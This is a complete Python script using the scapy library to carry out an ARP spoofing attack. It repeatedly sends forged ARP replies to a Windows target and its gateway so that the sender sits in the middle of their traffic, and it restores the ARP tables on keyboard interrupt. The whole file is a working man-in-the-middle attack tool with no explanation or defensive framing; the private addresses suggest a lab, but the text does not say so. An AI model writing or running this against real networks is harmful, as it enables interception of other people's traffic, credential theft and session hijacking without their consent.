from scapy.all import *
import time

target_ip = "10.15.50.228"    # Windows target
gateway_ip = "10.15.0.1"      # Gateway

target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

def spoof():
    while True:
        # Poison target's ARP cache (claim to be the gateway)
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
        # Poison gateway's ARP cache (claim to be the target)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
        time.sleep(2)  # Send ARP replies every 2 seconds

try:
    spoof()
except KeyboardInterrupt:
    print("\n[!] Restoring ARP tables...")
    # Restore target's ARP cache
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    # Restore gateway's ARP cache
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    print("[+] MITM stopped. ARP tables restored.")
